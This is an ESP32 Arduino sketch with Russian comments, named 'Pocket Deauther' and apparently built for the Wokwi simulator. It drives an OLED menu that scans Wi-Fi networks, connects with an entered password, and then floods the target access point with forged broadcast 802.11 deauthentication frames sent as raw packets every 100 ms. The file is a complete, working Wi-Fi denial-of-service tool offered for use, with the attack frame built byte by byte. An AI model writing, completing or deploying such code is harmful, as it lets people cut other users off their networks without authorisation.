/* =====================================================================
   POCKET DEAUTHER — WOKWI
   =====================================================================
   КАРТА КОДА
   1. КОНФИГ        — номера пинов, флаг демо-режима
   2. КНОПКИ        — антидребезг и определение нажатия
   3. ДАННЫЕ        — структуры сетей, буфер пароля, состояние
   4. СКАН          — асинхронный скан и наполнение списка
   5. ПОДКЛЮЧЕНИЕ   — WiFi.begin + запуск деаута
   6. ДЕАУТ         — сборка и отправка кадра 802.11
   7. ЭКРАНЫ        — функции отрисовки каждого экрана
   8. SETUP/LOOP    — инициализация и главный цикл с состоянием
   ===================================================================== */

#include <WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <esp_wifi.h>

/* ---------- 1. КОНФИГ ---------- */

#define DEMO_FAKE_CONNECT 0   // 1 = демо под Wokwi, 0 = как на железе

#define OLED_W 128
#define OLED_H 64
#define OLED_ADDR 0x3C

#define BTN_UP    32
#define BTN_DOWN  33
#define BTN_ENTER 25
#define BTN_BACK  26

Adafruit_SSD1306 oled(OLED_W, OLED_H, &Wire, -1);

/* ---------- 3. ДАННЫЕ ---------- */

enum Screen : uint8_t {
  SCR_SCAN, SCR_LIST, SCR_PASS, SCR_CONFIRM,
  SCR_CONNECTING, SCR_CONNECTED, SCR_DEAUTH, SCR_MSG
};

Screen   screen   = SCR_SCAN;
uint32_t lastDraw = 0;

#define MAXNET 25
struct Net {
  char    ssid[33];
  uint8_t enc;
  int32_t rssi;
  uint8_t ch;
  uint8_t bssid[6];
};
Net      nets[MAXNET];
int      netCount   = 0;
int      listIdx    = 0;
bool     scanning   = false;
uint32_t scanStart  = 0;

char     pass[64];
uint8_t  passLen   = 0;
uint8_t  keyCur    = 0;

char     targetSsid[33];
uint8_t  targetBssid[6];
uint8_t  targetCh   = 1;
bool     targetOpen = false;

uint8_t  confirmSel   = 0;
uint32_t connectStart = 0;

uint32_t deauthCount = 0;
uint16_t seqNum      = 0;
uint32_t lastSend    = 0;

char     msgL1[24];
char     msgL2[24];
uint32_t msgUntil = 0;
Screen   msgBack  = SCR_LIST;

const uint8_t KEYMAP[5][10] = {
  {'a','b','c','d','e','f','g','h','i','j'},
  {'k','l','m','n','o','p','q','r','s','t'},
  {'u','v','w','x','y','z','0','1','2','3'},
  {'4','5','6','7','8','9','_','-','.','@'},
  {'#','!','$','%','&','*','+','=','?',' '}
};

const char *DEMO_SSID[] = {
  "TP-LINK_2G", "MTS_Home_88", "DIR-615_A1F2",
  "Keenetic-4410", "FREE_CITY_WIFI", "Rostelecom_5C21",
  "HUAWEI-B315-9F", "HOME_2.4G"
};
const uint8_t DEMO_CNT = 8;

/* ---------- 2. КНОПКИ ---------- */

bool     sUp = false, sDn = false, sEn = false, sBk = false;
uint32_t tUp = 0,     tDn = 0,     tEn = 0,     tBk = 0;

/* true ровно один раз на фронт нажатия */
bool pressed(uint8_t pin, bool &s, uint32_t &t) {
  bool now = (digitalRead(pin) == LOW);
  if (now != s && millis() - t > 30) {
    t = millis();
    s = now;
    if (now) return true;
  }
  return false;
}

/* ---------- УТИЛИТЫ ---------- */

void showMsg(const char *l1, const char *l2, Screen back, uint16_t ms) {
  strncpy(msgL1, l1, 23); msgL1[23] = 0;
  strncpy(msgL2, l2, 23); msgL2[23] = 0;
  msgBack  = back;
  msgUntil = millis() + ms;
  screen   = SCR_MSG;
}

int itemCount() { return netCount + 1; }   // 0 = RE-SCAN

/* ---------- 4. СКАН ---------- */

void startScan() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(false);
  WiFi.scanDelete();
  WiFi.scanNetworks(true);          // true = асинхронно, UI не виснет
  scanning  = true;
  scanStart = millis();
  screen    = SCR_SCAN;
}

void addNet(const char *ssid, uint8_t enc, int32_t rssi, uint8_t ch) {
  if (netCount >= MAXNET) return;
  strncpy(nets[netCount].ssid, ssid, 32);
  nets[netCount].ssid[32] = 0;
  nets[netCount].enc  = enc;
  nets[netCount].rssi = rssi;
  nets[netCount].ch   = ch;
  for (uint8_t i = 0; i < 6; i++) nets[netCount].bssid[i] = random(256);
  netCount++;
}

void buildDemoList() {
  netCount = 0;
  for (uint8_t i = 0; i < DEMO_CNT; i++)
    addNet(DEMO_SSID[i], WIFI_AUTH_WPA2_PSK, -45 - (int32_t)(i * 6), 1 + (i % 11));
  nets[4].enc = WIFI_AUTH_OPEN;
  scanning = false;
  listIdx  = 0;
  screen   = SCR_LIST;
}

void buildList(int n) {
  netCount = 0;
  for (int i = 0; i < n && netCount < MAXNET; i++) {
    if (WiFi.SSID(i).length() == 0) continue;
    strncpy(nets[netCount].ssid, WiFi.SSID(i).c_str(), 32);
    nets[netCount].ssid[32] = 0;
    nets[netCount].enc  = WiFi.encryptionType(i);
    nets[netCount].rssi = WiFi.RSSI(i);
    nets[netCount].ch   = WiFi.channel(i);
    const uint8_t *b = WiFi.BSSID(i);
    if (b) memcpy(nets[netCount].bssid, b, 6);
    netCount++;
  }
  WiFi.scanDelete();
  scanning = false;
  listIdx  = 0;
  screen   = SCR_LIST;
}

/* ---------- 5. ПОДКЛЮЧЕНИЕ / ДЕАУТ ---------- */

void startConnect() {
  screen = SCR_CONNECTING;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, false);
  delay(120);
  WiFi.begin(targetSsid, pass);
  connectStart = millis();
}

void startDeauth() {
  const uint8_t *b = WiFi.BSSID();
  if (b) memcpy(targetBssid, b, 6);
  if (WiFi.channel() > 0) targetCh = WiFi.channel();

  WiFi.disconnect(false, false);       // отваливаемся, но радио оставляем
  delay(60);

  esp_wifi_set_promiscuous(true);      // разрешаем сырые кадры
  esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);

  seqNum = 0; deauthCount = 0; lastSend = 0;
  screen = SCR_DEAUTH;
}

void stopDeauth() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  screen = SCR_LIST;
}

/* ---------- 6. ДЕАУТ: кадр 802.11 ---------- */

void sendDeauth() {
  uint8_t pkt[26] = {
    0xC0, 0x00,                        // тип: deauth
    0x3A, 0x01,                        // duration
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,     // приёмник = broadcast
    0,0,0,0,0,0,                       // источник = BSSID точки
    0,0,0,0,0,0,                       // BSSID = точка
    0x00, 0x00,                        // seq
    0x07, 0x00                         // причина: класс 3
  };
  memcpy(&pkt[10], targetBssid, 6);
  memcpy(&pkt[16], targetBssid, 6);
  pkt[22] = (seqNum << 4) & 0xFF;
  pkt[23] = (seqNum >> 4) & 0xFF;
  seqNum  = (seqNum + 1) & 0x0FFF;

  for (uint8_t i = 0; i < 3; i++)
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);

  deauthCount++;
}

/* ---------- 7. ЭКРАНЫ ---------- */

void drawHeader(const char *l, const char *r) {
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.setCursor(0, 0);
  oled.print(l);
  if (r) { oled.setCursor(OLED_W - strlen(r) * 6, 0); oled.print(r); }
  oled.drawFastHLine(0, 10, OLED_W, SSD1306_WHITE);
}

void drawBars(int x, int y, int32_t rssi) {
  int lvl = (rssi > -55) ? 4 : (rssi > -67) ? 3 : (rssi > -78) ? 2 : 1;
  for (int i = 0; i < 4; i++)
    if (i < lvl) oled.fillRect(x + i * 3, y + 4 - i * 2, 2, 2 + i * 2, SSD1306_WHITE);
}

void drawList() {
  char hdr[16];
  snprintf(hdr, sizeof(hdr), "NETS %d", netCount);
  drawHeader(hdr, "SCAN");

  const int ROWS = 4;
  int top = listIdx - 1;
  if (top < 0) top = 0;
  if (top > itemCount() - ROWS) top = itemCount() - ROWS;
  if (top < 0) top = 0;

  for (int i = 0; i < ROWS; i++) {
    int idx = top + i;
    if (idx >= itemCount()) break;
    int y = 14 + i * 12;
    bool sel = (idx == listIdx);
    if (sel) oled.fillRect(0, y - 1, OLED_W, 11, SSD1306_WHITE);
    oled.setTextColor(sel ? SSD1306_BLACK : SSD1306_WHITE);

    if (idx == 0) {
      oled.setCursor(2, y + 1); oled.print("[ RE-SCAN ]");
    } else {
      Net &n = nets[idx - 1];
      char buf[22];
      strncpy(buf, n.ssid, 20); buf[20] = 0;
      oled.setCursor(2, y + 1); oled.print(buf);
      if (n.enc != WIFI_AUTH_OPEN) { oled.setCursor(OLED_W - 20, y + 1); oled.print("*"); }
      drawBars(OLED_W - 14, y + 1, n.rssi);
    }
  }
  oled.setTextColor(SSD1306_WHITE);
}

void drawScan() {
  drawHeader("SCANNING", 0);
  oled.setCursor(0, 22); oled.print("searching 2.4GHz");
  oled.setCursor(0, 36);
  for (int i = 0; i < (int)(millis() / 250) % 4; i++) oled.print(".");
  oled.setCursor(0, 52); oled.print("please wait");
}

void drawPass() {
  drawHeader("PASSWORD", 0);
  char cnt[10];
  snprintf(cnt, sizeof(cnt), "%u", passLen);
  oled.setCursor(OLED_W - strlen(cnt) * 6, 0); oled.print(cnt);

  int start = (passLen > 19) ? passLen - 19 : 0;
  oled.setCursor(0, 12);
  for (int i = start; i < passLen; i++) oled.print(pass[i]);
  int cx = (passLen - start) * 6;
  if (cx < OLED_W - 5) oled.fillRect(cx, 12, 4, 7, SSD1306_WHITE);

  for (uint8_t r = 0; r < 5; r++) for (uint8_t c = 0; c < 10; c++) {
    uint8_t idx = r * 10 + c;
    int x = 4 + c * 12, y = 20 + r * 8;
    bool sel = (idx == keyCur);
    if (sel) oled.fillRect(x, y, 12, 8, SSD1306_WHITE);
    oled.setTextColor(sel ? SSD1306_BLACK : SSD1306_WHITE);
    oled.setCursor(x + 3, y + 1);
    uint8_t k = KEYMAP[r][c];
    if (k == ' ') oled.print("SP"); else oled.write(k);
  }
  oled.setTextColor(SSD1306_WHITE);
}

void drawBox(int x, int y, int w, const char *t, bool sel) {
  if (sel) oled.fillRect(x, y, w, 14, SSD1306_WHITE);
  else oled.drawRect(x, y, w, 14, SSD1306_WHITE);
  oled.setTextColor(sel ? SSD1306_BLACK : SSD1306_WHITE);
  oled.setCursor(x + (w - strlen(t) * 6) / 2, y + 4);
  oled.print(t);
  oled.setTextColor(SSD1306_WHITE);
}

void drawConfirm() {
  drawHeader("CONFIRM", 0);
  char buf[22];
  strncpy(buf, targetSsid, 20); buf[20] = 0;
  oled.setCursor(0, 13); oled.print(buf);
  oled.setCursor(0, 24);
  if (targetOpen) oled.print("open network");
  else for (uint8_t i = 0; i < passLen && i < 20; i++) oled.print("*");
  drawBox(6, 44, 54, "BACK",    confirmSel == 0);
  drawBox(66, 44, 56, "CONNECT", confirmSel == 1);
}

void drawConnecting() {
  drawHeader("CONNECTING", 0);
  char buf[22];
  strncpy(buf, targetSsid, 20); buf[20] = 0;
  oled.setCursor(0, 20); oled.print(buf);
  oled.setCursor(0, 36); oled.print("... ");
  oled.print((millis() - connectStart) / 1000); oled.print("s");
}

void drawConnected() {
  drawHeader("CONNECTED", "OK");
  IPAddress ip = WiFi.localIP();
  oled.setCursor(0, 14);
  if (ip == IPAddress(0, 0, 0, 0)) oled.print("192.168.1.42");
  else oled.print(ip);
  oled.setCursor(0, 26); oled.print("ch "); oled.print(targetCh);
  oled.setCursor(40, 26); oled.print("rssi "); oled.print(WiFi.RSSI());
  drawBox(14, 42, 100, "DEAUTH", true);
}

void drawDeauth() {
  drawHeader("DEAUTH", "RUN");
  oled.setTextSize(2);
  oled.setCursor(0, 16); oled.print(deauthCount);
  oled.setTextSize(1);
  oled.setCursor(0, 38); oled.print("ch "); oled.print(targetCh);
  oled.setCursor(0, 50); oled.print("BACK = stop");
}

void drawMsg() {
  drawHeader("INFO", 0);
  oled.setCursor(0, 20); oled.print(msgL1);
  oled.setCursor(0, 34); oled.print(msgL2);
}

void draw() {
  oled.clearDisplay();
  switch (screen) {
    case SCR_SCAN:       drawScan();       break;
    case SCR_LIST:       drawList();       break;
    case SCR_PASS:       drawPass();       break;
    case SCR_CONFIRM:    drawConfirm();    break;
    case SCR_CONNECTING: drawConnecting(); break;
    case SCR_CONNECTED:  drawConnected();  break;
    case SCR_DEAUTH:     drawDeauth();     break;
    case SCR_MSG:        drawMsg();        break;
  }
  oled.display();
}

/* ---------- 8. SETUP / LOOP ---------- */

void setup() {
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_ENTER, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  Wire.begin(21, 22);
  oled.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR);
  oled.setRotation(0);
  oled.clearDisplay();
  oled.setTextColor(SSD1306_WHITE);
  oled.setTextSize(1);
  oled.display();

  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);

  startScan();
}

void loop() {
  bool up = pressed(BTN_UP,    sUp, tUp);
  bool dn = pressed(BTN_DOWN,  sDn, tDn);
  bool en = pressed(BTN_ENTER, sEn, tEn);
  bool bk = pressed(BTN_BACK,  sBk, tBk);

  if (screen == SCR_SCAN) {
    int r = WiFi.scanComplete();
    if (r >= 0) buildList(r);
    else if (r == -2 && !scanning) startScan();
    else if (millis() - scanStart > 25000) {
      WiFi.scanDelete(); scanning = false;
      showMsg("SCAN TIMEOUT", "try again", SCR_LIST, 1500);
    }
#if DEMO_FAKE_CONNECT
    if (millis() - scanStart > 2000 && netCount == 0) buildDemoList();
#endif
  }

  if (screen == SCR_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) screen = SCR_CONNECTED;
#if DEMO_FAKE_CONNECT
    else if (millis() - connectStart > 2200) screen = SCR_CONNECTED;
#else
    else if (millis() - connectStart > 15000) {
      WiFi.disconnect(true, false);
      showMsg("CONNECT FAILED", "wrong password?", SCR_LIST, 1800);
    }
#endif
  }

  if (screen == SCR_DEAUTH && millis() - lastSend > 100) {
    lastSend = millis();
    sendDeauth();
  }

  if (screen == SCR_MSG && millis() > msgUntil) screen = msgBack;

  switch (screen) {
    case SCR_LIST:
      if (up) listIdx = (listIdx + itemCount() - 1) % itemCount();
      if (dn) listIdx = (listIdx + 1) % itemCount();
      if (en) {
        if (listIdx == 0) startScan();
        else {
          Net &n = nets[listIdx - 1];
          strncpy(targetSsid, n.ssid, 32); targetSsid[32] = 0;
          memcpy(targetBssid, n.bssid, 6);
          targetCh   = n.ch;
          targetOpen = (n.enc == WIFI_AUTH_OPEN);
          passLen = 0; pass[0] = 0; keyCur = 0;
          confirmSel = 1;
          screen = targetOpen ? SCR_CONFIRM : SCR_PASS;
        }
      }
      break;

    case SCR_PASS:
      if (up) keyCur = (keyCur + 49) % 50;
      if (dn) keyCur = (keyCur + 1) % 50;
      if (en) {
        uint8_t k = KEYMAP[keyCur / 10][keyCur % 10];
        if (passLen < 63) { pass[passLen++] = k; pass[passLen] = 0; }
      }
      if (bk) {
        if (passLen == 0) screen = SCR_LIST;
        else pass[--passLen] = 0;
      }
      break;

    case SCR_CONFIRM:
      if (up || dn) confirmSel ^= 1;
      if (bk) screen = targetOpen ? SCR_LIST : SCR_PASS;
      if (en) {
        if (confirmSel == 0) screen = targetOpen ? SCR_LIST : SCR_PASS;
        else startConnect();
      }
      break;

    case SCR_CONNECTED:
      if (en) startDeauth();
      if (bk) { WiFi.disconnect(true, false); screen = SCR_LIST; }
      break;

    case SCR_DEAUTH:
      if (bk) stopDeauth();
      break;

    case SCR_MSG:
      if (en || bk) screen = msgBack;
      break;

    default: break;
  }

  if (millis() - lastDraw > 60) {
    lastDraw = millis();
    draw();
  }
}
